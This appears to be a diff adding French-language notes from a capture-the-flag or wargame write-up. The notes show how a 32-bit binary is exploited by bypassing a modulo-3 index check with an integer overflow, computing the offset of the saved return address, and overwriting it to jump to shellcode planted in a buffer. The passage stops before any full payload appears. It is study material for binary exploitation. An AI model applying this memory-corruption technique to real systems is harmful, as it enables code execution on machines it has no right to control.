@@ -1,0 +1,33 @@
+0x080486c2 <+146>:   mov    -0xc(%ebp),%eax
+0x080486c5 <+149>:   shl    $0x2,%eax			<- notre index est décalé de 2 bits vers la gauche
+0x080486c8 <+152>:   add    0x8(%ebp),%eax		<- puis à ça est ajouté l'adresse du buffer ce situant à 0x8 + $ebp
+0x080486cb <+155>:   mov    -0x10(%ebp),%edx
+0x080486ce <+158>:   mov    %edx,(%eax)			<- notre nombre est ensuite stocké
+
+Le décalage binaire nous permet de passer outre la vérification modulo 3 en donnant 1073741824 + notre index
+car 1073741824 = 01000000 00000000 00000000 00000000
+on sait donc maintenant que l'on peut stocké ce que l'on veut dans la mémoire, y compris notre shellcode !
+
+on va donc mettre notre shellcode dans les index 0 à 11 en faisant attention à utiliser ce que l'on vient d'appendre pour les nombres modulo 3 = 0
+
+on va récuperer l'adresse saved d'eip dans le main avec b main -> info frame
+Saved registers:
+  ebp at 0xffffd708, eip at 0xffffd70c
+
+il faudra donc stocké l'adresse du début du shellcode à cette adresse
+on sait déjà où récuperer l'adresse du buffer
+x/1x 0x8 + $ebp
+0xffffd520:     0xffffd544
+
+0xffffd70c - 0xffffd544 =
+4294956812 - 4294956356 = 456 / 4 = 114
+on peut donc écrire par dessus l'adresse de retour à l'index 114
+comme 114 % 3 = 0, on va utiliser 1073741824 + 114 = 1073741938
+
+l'adresse de notre shellcode est celle de notre buffer que l'on a déjà
+mais on ne peut pas simplement y écrire l'adresse de buffer car celle-ci changera en dehors de gdb
+par contre nous savons qu'elle est stocké à cette adresse: 0xffffd520
+
+0xffffd520 - 0xffffd544 =
+4294956320 - 4294956356 = -36 / 4 = -9
+on peut donc facilement trouver l'adresse de notre shellcode car celle ci est à l'index -9
